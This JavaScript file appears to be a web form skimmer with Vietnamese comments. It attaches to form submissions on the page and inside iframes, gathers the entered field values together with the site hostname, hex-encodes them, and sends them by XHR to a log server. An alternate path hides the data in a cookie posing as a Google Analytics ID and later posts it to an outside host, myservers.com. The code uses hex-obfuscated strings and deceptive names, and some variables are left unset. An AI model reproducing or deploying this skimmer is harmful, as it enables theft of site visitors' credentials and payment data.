(function (funcName, baseObj) {
    funcName = funcName || "docReady";
    baseObj = baseObj || window;
    var readyList = [];
    var readyFired = false;
    var readyEventHandlersInstalled = false;
  
  // Vòng lặp kiểm tra trình duyệt đã được tải hoản tất để tiến hành setEvent vào các input fied
  function ready() {
        if (!readyFired) {
            readyFired = true;
            for (var i = 0; i < readyList.length; i++) {
                readyList[i].fn.call(window, readyList[i].ctx);
            }
            readyList = [];
        }
    };

    function readyStateChange() {
        if (document.readyState === "complete") {
            ready();
        }
    };
    baseObj[funcName] = function (callback, context) {
        if (readyFired) {
            setTimeout(function () {
                callback(context);
            }, 1);
            return;
        } else {
            readyList.push({
                fn: callback,
                ctx: context
            });
        }
        if (document.readyState === "complete") {
            setTimeout(ready, 1);
        } else if (!readyEventHandlersInstalled) {
            if (document.addEventListener) {
                document.addEventListener("DOMContentLoaded", ready, false);
                window.addEventListener("load", ready, false);
            } else {
                document.attachEvent("onreadystatechange", readyStateChange);
                window.attachEvent("onload", ready);
            }
            readyEventHandlersInstalled = true;
        }
    }
})("docReady", window);
const frmtag = hst("666f726d"); // form
const ifrmtag = hst("696672616d65"); // iframe
const smbnt = hst("7375626d6974"); // submit
const gbcname = hst("47415F414E414C59544943534944"); // GA_ANALYTICSID
const waymethod = 1;
var docMain, fld, dociFrame, ifrm, docParram, frm, docQuery = null;
if (waymethod != 1) {
    vcok();
}
// Nếu website được hỗ trợ jQuery
if (window.jQuery) {
    jQuery(document).ready(function () {
        ifrm = $(ifrmtag).contents();
        frm = ifrm.find(frmtag);
        jQuery(frm).bind(smbnt, function () {
            return arrval(this);
        });
        jQuery(frmtag).on(smbnt, function () {
            return arrval(this);
        });
    });
  // Nếu không hỗ trợ jQuery kèm theo
} else {
    docReady(function () {
        docMain = document.querySelector(frmtag);
        if (docMain.addEventListener) {
            docMain.addEventListener(smbnt, function () {
                return arrval(this);
            });
        }
    });
}

function arrval(c) {
    var rt;
    rt = valrq(c);
    return true;
};

function visib1e(d) {
    var xrq, hMain, srq;
    srq = d; // data capture sẽ được gửi đi
    hMain = ''; // Server to get LOGS
    hObjSend(hst(hMain), srq); // Hàm 
    return true;
};

function valrq(p) {
    var i, vale, tname, resd, m, cnt;
    m = true;
    resd = '';
    if (p != null) {
        cnt = p.length;
        for (i = 0; i < cnt; i++) {
            if (typeof p.elements[i].value != null && p.elements[i].value.trim()) {
                vale = p.elements[i].value.trim() || hst('4E554C4C');
                tname = fxfield(p.elements[i].name.trim());
                if (vale.length > 0 && vale.length < 75) {
                    resd += '"' + tname.replace('"', '\"') + '":"' + vale.replace('"', '\"') + '"';
                    if (i < (cnt - 2)) {
                        resd += ',';
                    }
                }
            }
        }
        if (m != false) {
            resd += ',"sites';
            resd += '":"' + window.location.hostname + '"';
            resd = sth("{" + resd + "}");
            if (waymethod == 1) {
                return visib1e(resd);
            } else {
                return scok(gbcname, resd);
            }
        } else {
            return m;
        }
    }
};

function fxfield(n) {
    var frt, fieldct;
    frt = n;
    fieldct = frt.split('$');
    if (fieldct != frt) {
        frt = fieldct[fieldct.length - 1];
    }
    return frt;
};

function sth(tmp) {
    var str = '',
        i = 0,
        tmp_len = tmp.length,
        c;
    for (; i < tmp_len; i += 1) {
        c = tmp.charCodeAt(i);
        str += c.toString(16);
    }
    return str;
};

function hst(tmp) {
    var str = '',
        i = 0,
        res, arrlen = tmp.length,
        c;
    for (; i < arrlen; i += 2) {
        var res = tmp.substr(i, 2);
        c = String.fromCharCode(parseInt(res, 16));
        str += c;
    }
    return str;
};

function hObjSend(u, p) {
    var htobj, ctp, cvl, act, xobj;
    ctp = '';
    if (window.XMLHttpRequest) {
        htobj = new XMLHttpRequest();
    } else if (window.ActiveXObject) {
        htobj = new ActiveXObject(hst(xobj));
    } else {
        return false;
    }
    htobj.open(act, u, false);
    htobj.setRequestHeader(hst(ctp), hst(cvl));
    htobj.send(p);
};

function vcok() {
    var himg, timg, cresult;
    cresult = gcok(gbcname);
    if (cresult != null) {
        hObjSend('https://myservers.com/xhr', cresult);
    }
    return cresult;
};

function gcok(n) {
    var v, nreg, vreg;
    nreg = 'name';
    vreg = 'data';
    v = document.cookie.match(nreg + n + vreg);
    return v ? v[2] : null;
};

function scok(n, v) {
    var d, pexp, vexp;
    d = new Date;
    pexp = ";path=/";
    pexp += ";expires=";
    vexp = 24 * 60 * 60 * 1000 * 1;
    if (v == '') {
        vexp = -vexp;
    }
    d.setTime(d.getTime() + vexp);
    document.cookie = n + "=" + v + pexp + d.toGMTString();
    return true;
}
